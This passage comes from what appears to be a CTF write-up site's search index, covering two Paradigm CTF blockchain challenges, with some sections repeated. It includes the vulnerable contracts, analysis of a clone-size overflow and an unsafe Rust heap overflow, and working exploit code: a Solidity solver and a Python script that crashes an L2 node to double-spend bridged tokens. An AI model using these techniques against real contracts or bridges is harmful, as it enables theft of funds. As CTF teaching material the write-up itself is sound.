collateralDecrease , uint256 debtIncrease ) public view returns ( bool ) { ... uint256 totalBalance = address ( this ). balance - collateralDecrease ; ... return totalBalance * ethPrice / 1e8 >= totalDebt * configuration . getCollateralRatio () / 10000 ; } Notice that AccountManager uses ClonesWithImmutableArgs to create new accounts. When interacting with the Account , the immutable arguments will be read from calldata, saving gas costs. However, there's a comment in the ClonesWithImmutableArgs 1 /// @dev data cannot exceed 65535 bytes, since 2 bytes are used to store the data length Since the immutable arguments are stored in the code region of the created proxy contract, the code size will be calculated based on the data length during the deployment. However, the code size that should be returned is also stored in 2 bytes. Therefore, if runSize exceeds 65535 bytes, a broken contract may be deployed. We can then treat increaseDebt() as a phantom function and ignore the call 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 uint256 extraLength = data . length + 2 ; // +2 bytes for telling how much data there is appended to the call uint256 creationSize = 0x43 + extraLength ; uint256 runSize = creationSize - 11 ; ... // solhint-disable-next-line no-inline-assembly assembly { ptr := mload ( 0x40 ) // ------------------------------------------------------------------------------------------------------------- // CREATION (11 bytes) // ------------------------------------------------------------------------------------------------------------- // 3d | RETURNDATASIZE | 0 | \u2013 // 61 runtime | PUSH2 runtime (r) | r 0 | \u2013 mstore ( ptr , 0x3d61000000000000000000000000000000000000000000000000000000000000 ) mstore ( add ( ptr , 0x02 ), shl ( 240 , runSize )) // size of the contract running bytecode (16 bits) The existing arguments length is 20 + 20 + 32 = 72 bytes and the length of encoded recoveryAddresses will be a multiple of 32 bytes 1 2 3 4 5 6 7 8 9 10 11 function _openAccount ( address owner , address [] calldata recoveryAddresses ) private returns ( Account ) { Account account = Account ( SYSTEM_CONFIGURATION . getAccountImplementation (). clone ( abi . encodePacked ( SYSTEM_CONFIGURATION , owner , recoveryAddresses . length , recoveryAddresses ) ) ); validAccounts [ account ] = true ; return account ; } Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 contract Solve is CTFSolver { function solve ( address challenge_ , address player ) internal override { Challenge challenge = Challenge ( challenge_ ); AccountManager manager = AccountManager ( challenge . SYSTEM_CONFIGURATION (). getAccountManager ()); // 72 + 2044 * 32 + 2 + 0x43 - 11 = 65538 => 65538 % 65536 = 2 Account account = manager . openAccount ( player , new address []( 2044 )); manager . mintStablecoins ( account , 2 _000_000_000_000 ether , \"\" ); require ( challenge . isSolved ()); } } Flag \u00b6 PCTF{0V3RFl0W5_WH3r3_Y0u_L3a57_3xp3C7_17}","title":"Dai++"},{"location":"blockchain/paradigm/dai_plus_plus/#description","text":"MakerDAO is such a complex codebase, and we all know that larger codebases are more likely to have bugs. I simplified everything, so there shouldn't be any bugs here. Deploy.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; import \"forge-ctf/CTFDeployment.sol\" ; import \"../src/Challenge.sol\" ; import \"../src/SystemConfiguration.sol\" ; import { Account as Acct } from \"../src/Account.sol\" ; contract Deploy is CTFDeployment { function deploy ( address system , address ) internal override returns ( address challenge ) { vm . startBroadcast ( system ); SystemConfiguration configuration = new SystemConfiguration (); AccountManager manager = new AccountManager ( configuration ); configuration . updateAccountManager ( address ( manager )); configuration . updateStablecoin ( address ( new Stablecoin ( configuration ))); configuration . updateAccountImplementation ( address ( new Acct ())); configuration . updateEthUsdPriceFeed ( 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419 ); configuration . updateSystemContract ( address ( manager ), true ); challenge = address ( new Challenge ( configuration )); vm . stopBroadcast (); } } src/Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; import \"../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\" ; import \"./SystemConfiguration.sol\" ; contract Challenge { SystemConfiguration public immutable SYSTEM_CONFIGURATION ; constructor ( SystemConfiguration configuration ) { SYSTEM_CONFIGURATION = configuration ; } function isSolved () external view returns ( bool ) { return IERC20 ( SYSTEM_CONFIGURATION . getStablecoin ()). totalSupply () > 1 _000_000_000_000 ether ; } } src/SystemConfiguration.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 import \"@openzeppelin/contracts/access/Ownable.sol\" ; import \"./Account.sol\" ; contract SystemConfiguration is Ownable { address private accountImplementation ; address private ethUsdPriceFeed ; address private accountManager ; address private stablecoin ; uint256 private collateralRatio ; mapping ( address => bool ) private _systemContracts ; constructor () { collateralRatio = 15000 ; } function updateAccountImplementation ( address newImplementation ) external onlyOwner { accountImplementation = newImplementation ; } function updateEthUsdPriceFeed ( address newPriceFeed ) external onlyOwner { ethUsdPriceFeed = newPriceFeed ; } function updateStablecoin ( address newStablecoin ) external onlyOwner { stablecoin = newStablecoin ; } function updateAccountManager ( address newAccountManager ) external onlyOwner { accountManager = newAccountManager ; } function updateCollateralRatio ( uint256 newRatio ) external onlyOwner { collateralRatio = newRatio ; } function updateSystemContract ( address target , bool authorized ) external onlyOwner { _systemContracts [ target ] = authorized ; } function getAccountImplementation () external view returns ( address ) { return accountImplementation ; } function getEthUsdPriceFeed () external view returns ( address ) { return ethUsdPriceFeed ; } function getCollateralRatio () external view returns ( uint256 ) { return collateralRatio ; } function getStablecoin () external view returns ( address ) { return stablecoin ; } function getAccountManager () external view returns ( address ) { return accountManager ; } function isAuthorized ( address who ) external view returns ( bool ) { return _systemContracts [ who ]; } } src/Account.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 import \"@clones-with-immutable-args/src/Clone.sol\" ; import \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\" ; import \"@openzeppelin/contracts/utils/cryptography/SignatureChecker.sol\" ; import \"./SystemConfiguration.sol\" ; import \"./AccountManager.sol\" ; contract Account is Clone { event DebtIncreased ( uint256 amount , string memo ); event DebtDecreased ( uint256 amount , string memo ); uint256 private debt ; function deposit () external payable {} function withdraw ( uint256 amount ) external { require ( msg . sender == _getArgAddress ( 20 ), \"ONLY_ACCOUNT_HOLDER\" ); require ( isHealthy ( amount , 0 ), \"NOT_HEALTHY\" ); ( bool ok ,) = payable ( msg . sender ). call { value : amount }( hex \"\" ); require ( ok , \"TRANSFER_FAILED\" ); } function increaseDebt ( address operator , uint256 amount , string calldata memo ) external { SystemConfiguration configuration = SystemConfiguration ( _getArgAddress ( 0 )); require ( configuration . isAuthorized ( msg . sender ), \"NOT_AUTHORIZED\" ); require ( operator == _getArgAddress ( 20 ), \"ONLY_ACCOUNT_HOLDER\" ); require ( isHealthy ( 0 , amount ), \"NOT_HEALTHY\" ); debt += amount ; emit DebtIncreased ( amount , memo ); } function decreaseDebt ( uint256 amount , string calldata memo ) external { SystemConfiguration configuration = SystemConfiguration ( _getArgAddress ( 0 )); require ( configuration . isAuthorized ( msg . sender ), \"NOT_AUTHORIZED\" ); debt -= amount ; emit DebtDecreased ( amount , memo ); } function isHealthy ( uint256 collateralDecrease , uint256 debtIncrease ) public view returns ( bool ) { SystemConfiguration configuration = SystemConfiguration ( _getArgAddress ( 0 )); uint256 totalBalance = address ( this ). balance - collateralDecrease ; uint256 totalDebt = debt + debtIncrease ; (, int256 ethPriceInt ,,,) = AggregatorV3Interface ( configuration . getEthUsdPriceFeed ()). latestRoundData (); if ( ethPriceInt <= 0 ) return false ; uint256 ethPrice = uint256 ( ethPriceInt ); return totalBalance * ethPrice / 1e8 >= totalDebt * configuration . getCollateralRatio () / 10000 ; } function recoverAccount ( address newOwner , address [] memory newRecoveryAccounts , bytes [] memory signatures ) external returns ( Account ) { require ( isHealthy ( 0 , 0 ), \"UNHEALTHY_ACCOUNT\" ); bytes32 signHash = keccak256 ( abi . encodePacked ( block . chainid , _getArgAddress ( 20 ), newOwner , newRecoveryAccounts )); uint256 numRecoveryAccounts = _getArgUint256 ( 40 ); require ( signatures . length == numRecoveryAccounts , \"INCORRECT_LENGTH\" ); for ( uint256 i = 0 ; i < numRecoveryAccounts ; i ++ ) { require ( SignatureChecker . isValidSignatureNow ( _getArgAddress ( 72 + 32 * i ), signHash , signatures [ i ]), \"INVALID_SIGNATURE\" ); } SystemConfiguration configuration = SystemConfiguration ( _getArgAddress ( 0 )); uint256 currentDebt = debt ; debt = 0 ; return AccountManager ( configuration . getAccountManager ()). migrateAccount { value : address ( this ). balance }( newOwner , newRecoveryAccounts , currentDebt ); } } AccountManager.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 import \"@clones-with-immutable-args/src/ClonesWithImmutableArgs.sol\" ; import \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\" ; import \"./Account.sol\" ; import \"./Stablecoin.sol\" ; contract AccountManager { using ClonesWithImmutableArgs for address ; SystemConfiguration private immutable SYSTEM_CONFIGURATION ; mapping ( Account => bool ) public validAccounts ; constructor ( SystemConfiguration configuration ) { SYSTEM_CONFIGURATION = configuration ; } modifier onlyValidAccount ( Account account ) { require ( validAccounts [ account ], \"INVALID_ACCOUNT\" ); _ ; } function openAccount ( address owner , address [] calldata recoveryAddresses ) external returns ( Account ) { return _openAccount ( owner , recoveryAddresses ); } function migrateAccount ( address owner , address [] calldata recoveryAddresses , uint256 debt ) external payable returns ( Account ) { Account account = _openAccount ( owner , recoveryAddresses ); account . deposit { value : msg . value }(); account . increaseDebt ( owner , debt , \"account migration\" ); return account ; } function _openAccount ( address owner , address [] calldata recoveryAddresses ) private returns ( Account ) { Account account = Account ( SYSTEM_CONFIGURATION . getAccountImplementation (). clone ( abi . encodePacked ( SYSTEM_CONFIGURATION , owner , recoveryAddresses . length , recoveryAddresses ) ) ); validAccounts [ account ] = true ; return account ; } function mintStablecoins ( Account account , uint256 amount , string calldata memo ) external onlyValidAccount ( account ) { account . increaseDebt ( msg . sender , amount , memo ); Stablecoin ( SYSTEM_CONFIGURATION . getStablecoin ()). mint ( msg . sender , amount ); } function burnStablecoins ( Account account , uint256 amount , string calldata memo ) external onlyValidAccount ( account ) { account . decreaseDebt ( amount , memo ); Stablecoin ( SYSTEM_CONFIGURATION . getStablecoin ()). burn ( msg . sender , amount ); } } src/Stablecoin.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"./SystemConfiguration.sol\" ; contract Stablecoin is ERC20 ( \"US Dollar Stablecoin\" , \"USDS\" ) { SystemConfiguration private immutable SYSTEM_CONFIGURATION ; constructor ( SystemConfiguration configuration ) { SYSTEM_CONFIGURATION = configuration ; } function mint ( address to , uint256 amount ) external { require ( SYSTEM_CONFIGURATION . isAuthorized ( msg . sender ), \"NOT_AUTHORIZED\" ); _mint ( to , amount ); } function burn ( address from , uint256 amount ) external { require ( SYSTEM_CONFIGURATION . isAuthorized ( msg . sender ), \"NOT_AUTHORIZED\" ); _burn ( from , amount ); } }","title":"Description"},{"location":"blockchain/paradigm/dai_plus_plus/#solution","text":"The challenge is solved if the total supply of Stablecoin is greater than \\(10^{12} \\times 10^{18}\\) Accounts authorized by the SystemConfiguration contract can mint stable coins. Only the owner of SystemConfiguration can update system contracts (i.e. authorized accounts) and the AccountManager contract is the only authorized contract In the AccountManager contract, only valid accounts can mint stable coins. Meanwhile, the debt on the account will increase 1 2 3 4 5 6 7 8 function mintStablecoins ( Account account , uint256 amount , string calldata memo ) external onlyValidAccount ( account ) { account . increaseDebt ( msg . sender , amount , memo ); Stablecoin ( SYSTEM_CONFIGURATION . getStablecoin ()). mint ( msg . sender , amount ); } In the increaseDebt() function, if the account is not healthy after the debt is increased, the transaction will fail. However, the player don't have enough ETH to mint \\(10^{12}\\) stable coins and keep the account healthy 1 2 3 4 5 6 7 8 9 10 11 12 13 function increaseDebt ( address operator , uint256 amount , string calldata memo ) external { ... require ( isHealthy ( 0 , amount ), \"NOT_HEALTHY\" ); debt += amount ; ... } function isHealthy ( uint256 collateralDecrease , uint256 debtIncrease ) public view returns ( bool ) { ... uint256 totalBalance = address ( this ). balance - collateralDecrease ; ... return totalBalance * ethPrice / 1e8 >= totalDebt * configuration . getCollateralRatio () / 10000 ; } Notice that AccountManager uses ClonesWithImmutableArgs to create new accounts. When interacting with the Account , the immutable arguments will be read from calldata, saving gas costs. However, there's a comment in the ClonesWithImmutableArgs 1 /// @dev data cannot exceed 65535 bytes, since 2 bytes are used to store the data length Since the immutable arguments are stored in the code region of the created proxy contract, the code size will be calculated based on the data length during the deployment. However, the code size that should be returned is also stored in 2 bytes. Therefore, if runSize exceeds 65535 bytes, a broken contract may be deployed. We can then treat increaseDebt() as a phantom function and ignore the call 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 uint256 extraLength = data . length + 2 ; // +2 bytes for telling how much data there is appended to the call uint256 creationSize = 0x43 + extraLength ; uint256 runSize = creationSize - 11 ; ... // solhint-disable-next-line no-inline-assembly assembly { ptr := mload ( 0x40 ) // ------------------------------------------------------------------------------------------------------------- // CREATION (11 bytes) // ------------------------------------------------------------------------------------------------------------- // 3d | RETURNDATASIZE | 0 | \u2013 // 61 runtime | PUSH2 runtime (r) | r 0 | \u2013 mstore ( ptr , 0x3d61000000000000000000000000000000000000000000000000000000000000 ) mstore ( add ( ptr , 0x02 ), shl ( 240 , runSize )) // size of the contract running bytecode (16 bits) The existing arguments length is 20 + 20 + 32 = 72 bytes and the length of encoded recoveryAddresses will be a multiple of 32 bytes 1 2 3 4 5 6 7 8 9 10 11 function _openAccount ( address owner , address [] calldata recoveryAddresses ) private returns ( Account ) { Account account = Account ( SYSTEM_CONFIGURATION . getAccountImplementation (). clone ( abi . encodePacked ( SYSTEM_CONFIGURATION , owner , recoveryAddresses . length , recoveryAddresses ) ) ); validAccounts [ account ] = true ; return account ; }","title":"Solution"},{"location":"blockchain/paradigm/dai_plus_plus/#exploitation","text":"1 2 3 4 5 6 7 8 9 10 contract Solve is CTFSolver { function solve ( address challenge_ , address player ) internal override { Challenge challenge = Challenge ( challenge_ ); AccountManager manager = AccountManager ( challenge . SYSTEM_CONFIGURATION (). getAccountManager ()); // 72 + 2044 * 32 + 2 + 0x43 - 11 = 65538 => 65538 % 65536 = 2 Account account = manager . openAccount ( player , new address []( 2044 )); manager . mintStablecoins ( account , 2 _000_000_000_000 ether , \"\" ); require ( challenge . isSolved ()); } }","title":"Exploitation"},{"location":"blockchain/paradigm/dai_plus_plus/#flag","text":"PCTF{0V3RFl0W5_WH3r3_Y0u_L3a57_3xp3C7_17}","title":"Flag"},{"location":"blockchain/paradigm/enterprise_blockchain/","tags":["smart contract","cross chain","revm","precompiled contract","state override set","infrastructure"],"text":"#smart contract #cross chain #revm #precompiled contract #state override set #infrastructure .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Smart Contract Solutions is proud to introduce the only Enterprise Blockchain that you'll ever need. Challenge Files Solution \u00b6 There are two chains and the challenge is deployed on the layer 1 chain. Initially, there are 100 FlagTokens (18 decimals) in the l1Bridge. The objective of this challenge is to pull at least 10 FlagTokens from the l1Bridge 1 2 3 4 5 6 7 vm . createSelectFork ( vm . envString ( \"L1_RPC\" )); vm . startBroadcast ( system ); Bridge l1Bridge = new Bridge ( relayer ); FlagToken flagToken = new FlagToken ( address ( l1Bridge ), player ); challenge = address ( new Challenge ( address ( l1Bridge ), address ( flagToken ))); vm . stopBroadcast (); Users can transfer funds between chains via the bridge. The relayer will listen to the SendRemoteMessage event in both chains and relay messages to the target chain 1 2 3 4 5 6 7 8 9 10 11 if log . event == \"SendRemoteMessage\" : try : if _dst_chain_id == log . args [ \"targetChainId\" ]: tx_hash = dst_bridge . functions . relayMessage ( log . args [ \"targetAddress\" ], _src_chain_id , log . args [ \"sourceAddress\" ], log . args [ \"msgValue\" ], log . args [ \"msgNonce\" ], log . args [ \"msgData\" ], ) . transact () 1 2 3 4 5 6 7 8 9 10 11 12 13 function relayMessage ( address _targetAddress , uint256 _sourceChainId , address _sourceAddress , uint256 _value , uint256 _nonce , bytes calldata _message ) external onlyRelayer { ... ( bool success , bytes memory result ) = _targetAddress . call { value : _value }( _message ); require ( success , string ( result )); ... } To emit a SendRemoteMessage event, we can call sendRemoteMessage() function and the transaction to be executed on the other chain can be customized 1 2 3 4 5 6 7 8 9 10 11 function sendRemoteMessage ( uint256 _targetChainId , address _targetAddress , bytes calldata _message ) public payable { require ( _targetChainId != block . chainid , \"C\" ); require ( _targetAddress != address ( 0 ), \"A\" ); emit SendRemoteMessage ( _targetChainId , _targetAddress , msg . sender , msg . value , msgNonce , _message ); unchecked { ++ msgNonce ; } } Since L2 RPC is also provided and the player has some ethers, we can send a remote message from L2 to L1 and transfer tokens from l1Bridge to users 1 2 3 4 5 6 7 8 9 l2Bridge . sendRemoteMessage ( 78704 , address ( flagToken ), abi . encodeWithSignature ( \"transfer(address,uint256)\" , player , 50 ether ) ) However, the sendRemoteMessage() function is not intended to be public and it is expected to only use ethOut() / ERC20Out() to transfer funds between chains :< The above is an unintended solution lol A SimpleMultiSigGov is deployed at 0x31337 on the L2 chain. It can be used to interact with the precompiled contract ADMIN at 1337 1 2 3 4 5 6 # deploy multisig anvil_setCodeFromFile ( l2_web3 , \"0x0000000000000000000000000000000000031337\" , \"MultiSig.sol:SimpleMultiSigGov\" , ) The precompiled contract ADMIN has a function fn_dump_state() , operations in which may cause undefined behavior. First, x.len() should be greater than 0x10 , otherwise the program will panic with index out of bounds when i == x.len() . states is a raw pointer to slices &[u8] and a slice is 16 bytes on an x86-64. The count of states.offset is in units of a slice. Since the maximum of i is 0x10 , the minimum memory that should be allocated is 0x110 (16 * (0x10 + 1)) instead of 0x100 . Thus, if x.len() is greater than 0x10 , the program will write to unallocated memory states.offset(0x10) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 fn fn_dump_state ( x : & [ u8 ]) -> u64 { unsafe { let states : * mut & [ u8 ] = libc :: malloc ( 0x100 ) as * mut & [ u8 ]; let mut i = 0 ; while i <= x . len () && i <= 0x10 { states . offset ( i as isize ). write_bytes ( x [ i ], 1 as usize ); i += 1 ; } let mut file = fs :: OpenOptions :: new () . create ( true ) . write ( true ) . open ( \"/tmp/dump-state\" ). unwrap (); let _ = file . write_all ( &* states ); libc :: free ( states as * mut libc :: c_void ); } return 0 u64 ; } Calling fn_dump_state() when x.len() > 0x10 will kill the L2 node. The anvil service will soon restart and load the state from the previously dumped state The state dump interval is 5 seconds, but the relayer will relay the message as long as it catches the SendRemoteMessage event. If the L2 node goes down when new cross-chain transfer transactions have been included in a block but the latest state has not yet been dumped, the message will be relayed to L1 while the state of L2 can only be restored to the state before the transfer occurred. In this case, users can transfer funds to L1 without spending any in L2 :O 1 2 3 4 def format_anvil_args ( args : LaunchAnvilInstanceArgs , anvil_id : str , port : int = 8545 ) -> List [ str ]: ... cmd_args += [ \"--state\" , f \"/data/ { anvil_id } -state.json\" ] cmd_args += [ \"--state-interval\" , \"5\" ] Only the SimpleMultiSigGov at 0x31337 can interact with the ADMIN , but we can't obtain any valid signatures to let it execute transactions. Alternatively, we can leverage the state override set to ephemerally override the code at 0x31337 and simulate the call The admin_func_run() function is the entry point of ADMIN . To invoke the fn_dump_state() function, the first two bytes should be 0x0204 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 pub const ADMIN : PrecompileAddress = PrecompileAddress ( crate :: u64_to_address ( 1337 ), Precompile :: Context ( admin_func_run ), ); fn fn_reload_runtime_config ( rest : & [ u8 ], _context : & CallContext ) -> u64 { if rest . len () == 0 { return 1 u64 } else { return match ConfigKind :: from_u8 ( rest [ 0 ]) { .. . ConfigKind :: DumpState => fn_dump_state ( & rest [ 1 .. ]), _ => 1 u64 }; } } fn admin_func_run ( i : & [ u8 ], target_gas : u64 , context : & CallContext ) -> PrecompileResult { .. . if gas_base != target_gas { return Err ( Error :: OutOfGas ); } if i . len () == 0 || ! is_multisig ( & context ) { return Err ( Error :: EnterpriseHalt ); } let out = match AdminCallKind :: from_u8 ( i [ 0 ]) { AdminCallKind :: EmergencyStop => fn_emergency_stop ( & i [ 1 .. ], context ), AdminCallKind :: ReloadRuntimeConfig => fn_reload_runtime_config ( & i [ 1 .. ], context ), AdminCallKind :: Mint => fn_mint ( & i [ 1 .. ], context ), AdminCallKind :: Burn => fn_burn ( & i [ 1 .. ], context ), AdminCallKind :: Unknown => u64 :: MAX }; .. . } pub enum ConfigKind { .. . DumpState = 4 , Unknown , } pub enum AdminCallKind { EmergencyStop = 1 , ReloadRuntimeConfig = 2 , Mint = 3 , Burn = 4 , Unknown , } Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 import pwn from time import sleep from cheb3 import Connection from cheb3.utils import compile_sol , encode_with_signature , decode_data bridge_abi , _ = compile_sol ( \"\"\" interface IBridge { function remoteTokenToLocalToken(address) external view returns (address); function ERC20Out(address token, address to, uint256 amount) external; } \"\"\" , solc_version = \"0.8.20\" , )[ \"IBridge\" ] flag_token_abi , _ = compile_sol ( \"\"\" interface IFlagToken { function approve(address spender, uint256 amount) external returns (bool); function balanceOf(address account) external view returns (uint256); } \"\"\" , solc_version = \"0.8.20\" , )[ \"IFlagToken\" ] HOST = \"localhost\" PORT = 1337 svr = pwn . remote ( HOST , PORT ) svr . sendlineafter ( b \"action?\" , b \"1\" ) svr . recvuntil ( b \"rpc endpoints:\" ) l1 = Connection ( svr . recvline_contains ( b \"l1\" ) . replace ( b \"-\" , b \"\" ) . strip () . decode ()) l2 = Connection ( svr . recvline_contains ( b \"l2\" ) . replace ( b \"-\" , b \"\" ) . strip () . decode ()) priv = svr . recvline_contains ( b \"private\" ) . split ( b \":\" )[ - 1 ] . strip () . decode () setup = svr . recvline_contains ( b \"challenge\" ) . split ( b \":\" )[ - 1 ] . strip () . decode () svr . close () l1account = l1 . account ( priv ) l2account = l2 . account ( priv ) bridge = decode_data ( l1account . call ( setup , data = encode_with_signature ( \"BRIDGE()\" )), [ \"address\" ] ) l1bridge = l1 . contract ( l1account , address = bridge , abi = bridge_abi ) l2bridge = l2 . contract ( l2account , address = bridge , abi = bridge_abi ) flag_token_addr = decode_data ( l1account . call ( setup , data = encode_with_signature ( \"FLAG_TOKEN()\" )), [ \"address\" ] ) flag_token = l1 . contract ( l1account , address = flag_token_addr , abi = flag_token_abi ) # Transfer FlagTokens from L1 to L2 flag_token . functions . approve ( bridge , int ( 1e18 )) . send_transaction () l1bridge . functions . ERC20Out ( flag_token_addr , l2account . address , int ( 1e18 ) ) . send_transaction () # Waiting for message to be relayed sleep ( 2 ) l2token = l2bridge . caller . remoteTokenToLocalToken ( flag_token_addr ) # Waiting for the latest state to be dumped sleep ( 5 ) # Transfer FlagTokens from L2 to L1 for i in range ( 100 ): balance = flag_token . caller . balanceOf ( bridge ) print ( f \"FlagToken balance of l1Bridge: { balance } \" ) if balance < int ( 90e18 ): break l2balance = decode_data ( l2account . call ( l2token , data = encode_with_signature ( \"balanceOf(address)\" , l2account . address ), ), [ \"uint256\" ], ) print ( f \"FlagToken L2 balance of player: { l2balance } \" ) l2bridge . functions . ERC20Out ( l2token , l1account . address , int ( 5e17 ) - i # avoid same relay message hash ) . send_transaction () # Waiting for message to be relayed sleep ( 2 ) while True : try : # Kill the L2 node l2account . call ( \"0x0000000000000000000000000000000000031337\" , state_override = { \"0x0000000000000000000000000000000000031337\" : { # address(1337).staticcall{gas: 2000}(abi.encodePacked(hex\"0204\", new bytes(0x11))) \"code\" : \"0x6002600053600460015360006000601360006105396107d0fa\" }, }, ) continue except : # Waiting for L2 node to restart sleep ( 5 ) break svr = pwn . remote ( HOST , PORT ) svr . sendlineafter ( b \"action?\" , b \"3\" ) svr . interactive () Flag \u00b6 PCTF{57473_0V3RR1d35_90_8RR} References \u00b6 rust - Unexpected segfault when working with raw pointers - Stack Overflow Arrays and Slices - Rust By Example pointer - Rust eth_call - Ethereum","title":"Enterprise Blockchain"},{"location":"blockchain/paradigm/enterprise_blockchain/#description","text":"Smart Contract Solutions is proud to introduce the only Enterprise Blockchain that you'll ever need. Challenge Files","title":"Description"},{"location":"blockchain/paradigm/enterprise_blockchain/#solution","text":"There are two chains and the challenge is deployed on the layer 1 chain. Initially, there are 100 FlagTokens (18 decimals) in the l1Bridge. The objective of this challenge is to pull at least 10 FlagTokens from the l1Bridge 1 2 3 4 5 6 7 vm . createSelectFork ( vm . envString ( \"L1_RPC\" )); vm . startBroadcast ( system ); Bridge l1Bridge = new Bridge ( relayer ); FlagToken flagToken = new FlagToken ( address ( l1Bridge ), player ); challenge = address ( new Challenge ( address ( l1Bridge ), address ( flagToken ))); vm . stopBroadcast (); Users can transfer funds between chains via the bridge. The relayer will listen to the SendRemoteMessage event in both chains and relay messages to the target chain 1 2 3 4 5 6 7 8 9 10 11 if log . event == \"SendRemoteMessage\" : try : if _dst_chain_id == log . args [ \"targetChainId\" ]: tx_hash = dst_bridge . functions . relayMessage ( log . args [ \"targetAddress\" ], _src_chain_id , log . args [ \"sourceAddress\" ], log . args [ \"msgValue\" ], log . args [ \"msgNonce\" ], log . args [ \"msgData\" ], ) . transact () 1 2 3 4 5 6 7 8 9 10 11 12 13 function relayMessage ( address _targetAddress , uint256 _sourceChainId , address _sourceAddress , uint256 _value , uint256 _nonce , bytes calldata _message ) external onlyRelayer { ... ( bool success , bytes memory result ) = _targetAddress . call { value : _value }( _message ); require ( success , string ( result )); ... } To emit a SendRemoteMessage event, we can call sendRemoteMessage() function and the transaction to be executed on the other chain can be customized 1 2 3 4 5 6 7 8 9 10 11 function sendRemoteMessage ( uint256 _targetChainId , address _targetAddress , bytes calldata _message ) public payable { require ( _targetChainId != block . chainid , \"C\" ); require ( _targetAddress != address ( 0 ), \"A\" ); emit SendRemoteMessage ( _targetChainId , _targetAddress , msg . sender , msg . value , msgNonce , _message ); unchecked { ++ msgNonce ; } } Since L2 RPC is also provided and the player has some ethers, we can send a remote message from L2 to L1 and transfer tokens from l1Bridge to users 1 2 3 4 5 6 7 8 9 l2Bridge . sendRemoteMessage ( 78704 , address ( flagToken ), abi . encodeWithSignature ( \"transfer(address,uint256)\" , player , 50 ether ) ) However, the sendRemoteMessage() function is not intended to be public and it is expected to only use ethOut() / ERC20Out() to transfer funds between chains :< The above is an unintended solution lol A SimpleMultiSigGov is deployed at 0x31337 on the L2 chain. It can be used to interact with the precompiled contract ADMIN at 1337 1 2 3 4 5 6 # deploy multisig anvil_setCodeFromFile ( l2_web3 , \"0x0000000000000000000000000000000000031337\" , \"MultiSig.sol:SimpleMultiSigGov\" , ) The precompiled contract ADMIN has a function fn_dump_state() , operations in which may cause undefined behavior. First, x.len() should be greater than 0x10 , otherwise the program will panic with index out of bounds when i == x.len() . states is a raw pointer to slices &[u8] and a slice is 16 bytes on an x86-64. The count of states.offset is in units of a slice. Since the maximum of i is 0x10 , the minimum memory that should be allocated is 0x110 (16 * (0x10 + 1)) instead of 0x100 . Thus, if x.len() is greater than 0x10 , the program will write to unallocated memory states.offset(0x10) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 fn fn_dump_state ( x : & [ u8 ]) -> u64 { unsafe { let states : * mut & [ u8 ] = libc :: malloc ( 0x100 ) as * mut & [ u8 ]; let mut i = 0 ; while i <= x . len () && i <= 0x10 { states . offset ( i as isize ). write_bytes ( x [ i ], 1 as usize ); i += 1 ; } let mut file = fs :: OpenOptions :: new () . create ( true ) . write ( true ) . open ( \"/tmp/dump-state\" ). unwrap (); let _ = file . write_all ( &* states ); libc :: free ( states as * mut libc :: c_void ); } return 0 u64 ; } Calling fn_dump_state() when x.len() > 0x10 will kill the L2 node. The anvil service will soon restart and load the state from the previously dumped state The state dump interval is 5 seconds, but the relayer will relay the message as long as it catches the SendRemoteMessage event. If the L2 node goes down when new cross-chain transfer transactions have been included in a block but the latest state has not yet been dumped, the message will be relayed to L1 while the state of L2 can only be restored to the state before the transfer occurred. In this case, users can transfer funds to L1 without spending any in L2 :O 1 2 3 4 def format_anvil_args ( args : LaunchAnvilInstanceArgs , anvil_id : str , port : int = 8545 ) -> List [ str ]: ... cmd_args += [ \"--state\" , f \"/data/ { anvil_id } -state.json\" ] cmd_args += [ \"--state-interval\" , \"5\" ] Only the SimpleMultiSigGov at 0x31337 can interact with the ADMIN , but we can't obtain any valid signatures to let it execute transactions. Alternatively, we 